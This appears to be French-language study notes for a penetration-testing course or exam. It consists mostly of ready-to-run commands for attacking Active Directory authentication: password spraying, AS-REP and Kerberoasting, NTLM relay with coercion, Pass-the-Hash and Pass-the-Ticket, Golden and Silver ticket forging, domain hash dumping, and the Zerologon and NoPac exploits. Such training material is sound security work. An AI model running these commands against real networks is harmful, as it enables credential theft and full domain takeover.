# 21 — Attacking Active Directory Authentication

## Objectifs
Attaquer Kerberos et NTLM : roast, spray, relais, Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket.

---

## 1. Carte des attaques

| Attaque | Prérequis | Résultat |
|---|---|---|
| Password spraying | liste users | creds valides |
| AS-REP roasting | compte sans pré-auth | hash crackable |
| Kerberoasting | compte authentifié | hash de service crackable |
| NTLM relay | SMB signing off | session / exécution |
| Pass-the-Hash | hash NTLM | accès sans mot de passe |
| Pass-the-Ticket | TGT/TGS | accès Kerberos |
| Silver Ticket | hash de service | accès au service |
| Golden Ticket | hash krbtgt | domination du domaine |
| Zerologon | DC non patché | DA immédiat |

---

## 2. Password spraying

```bash
# Lire la policy (lockoutThreshold)
netexec smb <DC_IP> -u <USER> -p <PASS> --pass-pol
```

```bash
# Spray : 1 mot de passe, N comptes, lent
netexec smb <DC_IP> -u users.txt -p 'Winter2026!' --continue-on-success
netexec ldap <DC_IP> -u users.txt -p 'Winter2026!' --continue-on-success

# Saison + année, nom de la société, etc.
for p in 'Spring2026!' 'Company2026!' 'Password123'; do
  netexec smb <DC_IP> -u users.txt -p "$p" --continue-on-success
done
```

```bash
# Avec un compte valide : chercher les comptes dont le mdp = username
netexec smb <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

---

## 3. AS-REP roasting

```bash
# Sans credentials
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep.txt

# Avec credentials (tous les comptes vulnérables)
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt <WORDLIST> --force
john --format=krb5asrep --wordlist=<WORDLIST> asrep.txt
```

---

## 4. Kerberoasting

```bash
# Lister les SPN + demander les tickets
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerb.txt

# Crack (RC4 = rapide, AES = lent)
hashcat -m 13100 kerb.txt <WORDLIST> --force
john --format=krb5tgs --wordlist=<WORDLIST> kerb.txt
```

```powershell
# Depuis Windows
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

> Cibler les comptes de service avec des mots de passe faibles. Un mot de passe de 25+ caractères ne tombera pas.

---

## 5. NTLM relay

```bash
# 1. Identifier les cibles sans SMB signing
netexec smb <DC_IP> --gen-relay-list relay.txt
# ou scan du subnet
netexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Lancer le relais
impacket-ntlmrelayx -tf relay.txt -smb2support

# 3. Forcer une authentification (coercition)
netexec smb <TARGET> -u <USER> -p <PASS> -M coerce_plus
# ou PetitPotam / printerbug
python3 PetitPotam.py <LHOST> <TARGET>
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET> <LHOST>
```

```bash
# Relais vers LDAP (créer un compte machine / RBCD)
impacket-ntlmrelayx -t ldap://<DC_IP> --add-computer
# Relais avec exécution
impacket-ntlmrelayx -tf relay.txt -smb2support -e shell.exe
# Shell interactif
impacket-ntlmrelayx -tf relay.txt -smb2support -i
```

> Ne fonctionne pas vers un DC avec SMB signing obligatoire (par défaut sur les DC récents) → viser LDAP/HTTP.

---

## 6. Pass-the-Hash

```bash
# SMB
netexec smb <TARGET> -u Administrator -H <NTHASH> --local-auth
impacket-psexec <DOMAIN>/Administrator@<TARGET> -hashes :<NTHASH>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>

# WinRM
evil-winrm -i <TARGET> -u Administrator -H <NTHASH>

# LDAP (lecture)
netexec ldap <DC_IP> -u <USER> -H <NTHASH> --users
```

---

## 7. Pass-the-Ticket / Overpass-the-Hash

```bash
# Obtenir un TGT depuis un hash
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTHASH>
export KRB5CCNAME=<USER>.ccache

# Utiliser le ticket
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
impacket-smbexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
netexec smb <TARGET> -u <USER> -k --use-kcache
```

```bash
# Depuis Windows (Rubeus)
.\Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /ptt
.\Rubeus.exe ptt /ticket:<BASE64>
klist
```

---

## 8. Golden / Silver Ticket

### Golden Ticket (krbtgt)
```bash
# Nécessite : hash krbtgt + SID du domaine
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt

impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

### Silver Ticket (hash de service)
```bash
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <SID> -domain <DOMAIN> \
  -spn <SPN> <USER>
```

```powershell
# Rubeus
.\Rubeus.exe golden /rc4:<KRBTGT> /domain:<DOMAIN> /sid:<SID> /user:Administrator /ptt
.\Rubeus.exe silver /service:cifs/<TARGET> /rc4:<HASH> /sid:<SID> /domain:<DOMAIN> /user:<USER> /ptt
```

> Golden Ticket = persistance totale. En examen : preuve d'accès DA suffit, ne pas « casser » le domaine.

---

## 9. Zerologon / NoPac (selon patch)

```bash
# Zerologon (DC non patché) → reset du mot de passe machine du DC
python3 zerologon_tester.py <DC_NAME> <DC_IP>
python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP>
impacket-secretsdump -just-dc -no-pass <DOMAIN>/<DC_NAME>\$@<DC_IP>

# NoPac (CVE-2021-42278/42287)
python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_NAME> --impersonate administrator -shell
```

---

## 10. Après l'authentification

```bash
# Dump du domaine
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm

# Réutilisation massive
netexec smb 10.10.10.0/24 -u <USER> -H <NTHASH> --continue-on-success
netexec winrm 10.10.10.0/24 -u <USER> -p <PASS> --continue-on-success
```

---

## 11. Checklist

- [ ] Policy de verrouillage connue
- [ ] Spray effectué (1 mdp × N comptes)
- [ ] AS-REP roast + crack
- [ ] Kerberoast + crack
- [ ] SMB signing vérifié, relais tenté
- [ ] Hashes dumpés et testés en PtH
- [ ] TGT/TGS utilisés
- [ ] Golden/Silver si krbtgt ou hash service
- [ ] Creds réutilisés sur tout le domaine
- [ ] Preuve d'accès DA
